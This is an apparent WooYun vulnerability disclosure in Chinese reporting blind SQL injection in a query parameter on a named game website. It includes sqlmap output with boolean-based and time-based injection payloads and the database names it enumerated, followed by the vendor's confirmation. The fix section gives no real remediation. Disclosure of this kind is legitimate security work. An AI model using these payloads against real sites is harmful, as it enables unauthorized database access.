wybug_detail:
漏洞详情 披露状态：   									2014-07-31：	细节已通知厂商并且等待厂商处理中									2014-08-05：	厂商已经确认，细节仅向厂商公开									2014-08-15：	细节向核心白帽子及相关领域专家公开									2014-08-25：	细节向普通白帽子公开									2014-09-04：	细节向实习白帽子公开									2014-09-14：	细节向公众公开  简要描述： .. 详细说明：  注入点:www.twgame.com.cn/c/?k=1盲注   漏洞证明：  


sqlmap identified the following injection points with a total of 73 HTTP(s) requests:---Place: GETParameter: k    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: k=1%' AND 9821=9821 AND '%'='    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: k=1%' AND SLEEP(5) AND '%'='---web application technology: Apacheback-end DBMS: MySQL 5.0.11sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: k    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: k=1%' AND 9821=9821 AND '%'='    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: k=1%' AND SLEEP(5) AND '%'='---web application technology: Apacheback-end DBMS: MySQL 5.0.11available databases [3]:[*] admin_games[*] information_schema[*] test
   修复方案：  .. 刷分 求礼物   版权声明：转载请注明来源 眯眯眼@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2014-08-05 16:20 厂商回复： 感谢对新浪安全的支持 最新状态： 暂无
